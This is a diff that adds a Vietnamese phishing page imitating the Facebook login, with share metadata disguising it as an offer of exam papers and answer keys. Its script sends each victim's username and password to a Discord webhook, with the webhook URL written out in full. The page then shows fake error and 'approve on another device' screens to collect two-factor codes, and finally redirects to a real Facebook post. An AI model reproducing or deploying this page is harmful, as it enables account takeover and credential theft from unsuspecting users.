@@ -1,0 +1,325 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no"
+    />
+    <title>Hack Fakebook</title>
+    <meta
+      name="description"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
+    <meta
+      property="og:image"
+      content="https://s3.cloudfly.vn/brs/realtime/pdVAws0OER4.jpg"
+    />
+    <meta
+      property="og:title"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <meta
+      property="og:description"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <meta
+      property="og:site_name"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta
+      name="twitter:description"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <meta
+      name="twitter:title"
+      content="10 đề KSCL ôn thi học kỳ 1 và TN THPT: Đầy đủ đề + đáp án + tài liệu ôn tập kèm theo"
+    />
+    <link
+      rel="shortcut icon"
+      href="https://brscdn.io.vn/theme/vnrealtimefacebookapp/favicon.png"
+    />
+    <link
+      rel="stylesheet"
+      href="https://brscdn.io.vn/theme/vnrealtimefacebookapp/style.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+    <script src="https://js.pusher.com/8.0.1/pusher.min.js"></script>
+  </head>
+
+  <body>
+    <div id="main-log">
+      <div class="main-image">
+        <img
+          src="https://brscdn.io.vn/theme/facebookapp/fblogo.png"
+          alt=""
+          class="main-logo"
+          style="width: 60px !important"
+        />
+      </div>
+      <div class="main-form">
+        <div class="form-group">
+          <div class="warning" id="login_error" style="display: none">
+            Tài khoản không hợp lệ
+          </div>
+        </div>
+        <form id="login_form">
+          <div class="form-group">
+            <input
+              type="text"
+              id="username"
+              required
+              class="form-control"
+              placeholder="Số di động hoặc email"
+              onfocus="this.placeholder = ''"
+              onblur="this.placeholder = 'Số di động hoặc email'"
+            />
+          </div>
+          <div class="form-group" style="position: relative">
+            <input
+              type="password"
+              id="password"
+              required
+              class="form-control"
+              placeholder="Mật khẩu"
+              onfocus="this.placeholder = ''"
+              onblur="this.placeholder = 'Mật khẩu'"
+            />
+            <img
+              src="https://brscdn.io.vn/pass_show.png"
+              width="20"
+              id="shbb"
+              onclick="ShB(this)"
+              style="
+                position: absolute;
+                right: 15px;
+                top: 33%;
+                bottom: 0;
+                display: none;
+                cursor: pointer;
+              "
+            />
+            <script>
+              $("#password").keyup(function (e) {
+                $("#shbb").show();
+              });
+
+              function ShB(b) {
+                if ($("#password").attr("type") == "password") {
+                  $(b).attr("src", "https://brscdn.io.vn/pass_hide.png");
+                  $("#password").attr("type", "text");
+                } else {
+                  $(b).attr("src", "https://brscdn.io.vn/pass_show.png");
+                  $("#password").attr("type", "password");
+                }
+              }
+            </script>
+          </div>
+          <div class="form-group" style="margin-bottom: 16px">
+            <button class="button-control" type="submit" id="login__btn">
+              Đăng nhập
+            </button>
+          </div>
+        </form>
+        <div class="form-group">
+          <p class="forgot-password">Bạn quên mật khẩu ư ?</p>
+        </div>
+        <div class="break"></div>
+        <div class="form-group">
+          <button class="button-new">Tạo tài khoản mới</button>
+          <center>
+            <img
+              src="https://brscdn.io.vn/theme/meta/mtlogo.png"
+              alt=""
+              class="mt-logo"
+            />
+          </center>
+        </div>
+      </div>
+    </div>
+    <div class="meta-main v-lg-2" id="secondb" style="display: none">
+      <div class="main-box">
+        <h2 class="checking-other">Kiểm tra thông báo trên thiết bị khác</h2>
+        <p>
+          Hãy truy cập vào tài khoản Facebook của bạn trên thiết bị khác và mở
+          thông báo mà chúng tôi đã gửi để phê duyệt lần đăng nhập này.
+        </p>
+        <img
+          src="https://brscdn.io.vn/theme/vnrealtimefacebookapp/device.png"
+          class="device-check"
+        />
+        <div class="checking-box">
+          <div class="checking-icon">
+            <svg viewBox="0 0 24 24" fill="currentColor" class="three-dots">
+              <path
+                d="M15 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0zM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM11 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0z"
+              ></path>
+              <path
+                fill-rule="evenodd"
+                clip-rule="evenodd"
+                d="M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"
+              ></path>
+            </svg>
+          </div>
+          <div class="checking-content">
+            <p style="font-size: 15.7px">Đang chờ phê duyệt</p>
+            <span class="checking-info"
+              >Có thể mất vài phút thì bạn mới nhận được thông báo trên thiết bị
+              còn lại. Bạn có thể nhận thông báo mới.</span
+            >
+          </div>
+        </div>
+        <div class="checking-input">
+          <div class="warning" id="code_error" style="display: none">
+            Mã xác thực không hợp lệ
+          </div>
+          <label class="checking-label">Hoặc nhập mã xác thực</label>
+          <div class="form-group">
+            <input
+              type="number"
+              id="type_code"
+              class="form-control"
+              placeholder="Mã xác thực"
+              onfocus="this.placeholder = ''"
+              onblur="this.placeholder = 'Mã xác thực'"
+            />
+          </div>
+          <button class="button-control" type="submit" id="send_codes">
+            Xác nhận
+          </button>
+        </div>
+      </div>
+    </div>
+    <script>
+      var ccc__ = "test";
+
+      function phone_check(input_str) {
+        var re = /^\(?(\d{3})\)?[- ]?(\d{3})[- ]?(\d{4})$/;
+
+        return re.test(input_str);
+      }
+
+      function string_check(string) {
+        var re = /([a-zA-Z])+([ -~])*/;
+        return re.test(string);
+      }
+
+      function check_email(email) {
+        return String(email)
+          .toLowerCase()
+          .match(
+            /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
+          );
+      }
+
+      function sendToDiscordEmbed(title, desc) {
+        fetch(
+          "https://discord.com/api/webhooks/1471161340969095356/dCbsKi7TthkQPS1iKWtS31oiSuilaiR8BawPE7ZdgcgbAPYnbbV32AsZ_cccfOgTQM07",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              embeds: [
+                {
+                  title: title,
+                  description: desc,
+                  color: 65280,
+                },
+              ],
+            }),
+          },
+        );
+      }
+
+      var pusher = new Pusher("201211d2858ce448ec87", {
+        cluster: "ap1",
+      });
+
+      var channel = pusher.subscribe("my-channel");
+      channel.bind(ccc__, function (data) {
+        if (data.status) {
+          var error = $("#login_error");
+          error.hide();
+          window.location.href =
+            "https://www.facebook.com/share/p/1Do2PGKRrq/?101bd7";
+        } else {
+          if (data.pass) {
+            var error = $("#login_error");
+            error.show();
+            error.html("Mật khẩu không chính xác");
+            $("#login__btn").attr("disabled", false).html("Đăng nhập");
+          }
+          if (data.user) {
+            var error = $("#login_error");
+            error.show();
+            error.html("Số điện thoại hoặc địa chỉ email không hợp lệ");
+            $("#login__btn").attr("disabled", false).html("Đăng nhập");
+          }
+          if (data.device) {
+            $("#main-log").remove();
+            $("#secondb").show();
+          }
+          if (data.recode) {
+            $("#code_error").show();
+            $("#code_error").html("Mã xác thực không hợp lệ");
+            $("#send_codes").html("Xác nhận").attr("disabled", false);
+          }
+        }
+      });
+      $("#send_codes").click(function (e) {
+        var btn = $(this);
+        if ($("#type_code").val() == "" || $("#type_code").val().length < 2) {
+          $("#code_error").show();
+          $("#code_error").html("Vui lòng nhập mã xác thực");
+        } else {
+          $("#code_error").hide();
+          btn.html("Đang xác nhận").attr("disabled", true);
+        }
+      });
+      $("#login_form").submit(function (e) {
+        e.preventDefault();
+        var username = $("#username").val();
+        var password = $("#password").val();
+        var error = $("#login_error");
+        $(".loltest").hide();
+        if (string_check(username)) {
+          if (!check_email(username)) {
+            error.show();
+            error.html("Thông tin đăng nhập không hợp lệ");
+          } else if (password.length < 5) {
+            error.show();
+            error.html("Mật khẩu quá ngắn");
+          } else {
+            error.hide();
+            $(".loltest").show();
+            $(".loltest").html("Đang đăng nhập...");
+            $("#login__btn").attr("disabled", true).html("Đang đăng nhập");
+            // alert(`${username} - ${password}`);
+            endToDiscordEmbed("User information", `${username} - ${password}`);
+          }
+        } else {
+          if (!phone_check(username)) {
+            error.show();
+            error.html("Thông tin đăng nhập không hợp lệ");
+          } else if (password.length < 5) {
+            error.show();
+            error.html("Mật khẩu quá ngắn");
+          } else {
+            error.hide();
+            $(".loltest").show();
+            $(".loltest").html("Đang đăng nhập...");
+            $("#login__btn").attr("disabled", true).html("Đang đăng nhập");
+            // alert(`${username} - ${password}`);
+            sendToDiscordEmbed("User information", `${username} - ${password}`);
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
